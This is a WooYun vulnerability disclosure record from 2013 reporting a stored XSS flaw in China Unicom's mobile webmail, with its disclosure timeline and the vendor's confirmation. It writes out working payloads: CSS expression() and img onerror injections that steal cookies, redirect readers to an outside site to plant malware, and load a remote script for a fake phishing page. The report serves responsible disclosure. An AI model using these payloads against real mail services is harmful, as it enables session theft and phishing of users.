{"id": 8868, "wybug_id": "wooyun-2013-035969", "wybug_title": "中国联通手机邮箱web/wap版XSS漏洞", "wybug_corp": "中国联通", "wybug_author": "Liuz5O69", "wybug_date": "2013-09-03 11:19", "wybug_open_date": "2013-10-18 11:20", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型", "联通手机邮箱"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-18：\t细节向公众公开  简要描述： 中国联通邮箱邮件正文对部分标签下的脚本过滤不严，导致存储型跨站漏洞，利用该漏洞可实施Cookie窃取、网页挂马、跨站钓鱼等攻击。 详细说明：  同之前公布的漏洞利用方式不同，联通桌面版的web邮箱已不存在img标签下的XSS,本次可用的是CSS expression下的XSS,另外，wap版下的邮箱依然可用img进行XSS。如发送邮件：<DIV STYLE=\"width: expression((window.r==1)?'':(window.r=1,alert('expression_XSS')));\">如图：\n\nwap下提交：<img src=\"\" onerror=\"alert('null_img_xss')\">如图：\n\n   漏洞证明：  WEB版本：1.提交<DIV STYLE=\"width: expression((window.r==1)?'':(window.r=1,window.location.href='http://tools88.com/'));\"> 可实施挂马攻击，如图:\n\n2.提交<DIV STYLE=\"width: expression((window.r==1)?'':(window.r=1,alert(top.window.document.cookie)));\"> 可实施cookie的获取(注意需要加上top.window,邮件正文页面部分的location.href为about:blank，直接获取不到cookie),如图：\n\n3.提交<DIV STYLE='width: expression((window.r==1)?\"\":(window.r=1,b=top.window.document.createElement(\"script\"),b.src=\"&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;.......(恶意功能JS脚本地址，需编码);\",top.window.document.body.appendChild(b)));'> 来实施XSS钓鱼欺骗攻击，如图：\n\n可以看到URL依然为wo邮箱的地址，但实际该页面已经是虚假钓鱼页面，页面代码由指向的JS生成，JS代码如图：\n\nWAP版：利用方式差不多,如图为iphone访问wap页面后cookie窃取效果：手机端访问：\n\n信息获取：\n\n   修复方案：  过滤   版权声明：转载请注明来源 Liuz5O69@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2013-09-07 22:47 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-07 23:19 |    \t\t想要减肥的胖纸 \t\t\t( 普通白帽子  |\t\t\t        Rank:250 漏洞数:42        )\t\t \n  尼玛。存在N久的漏洞了     \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}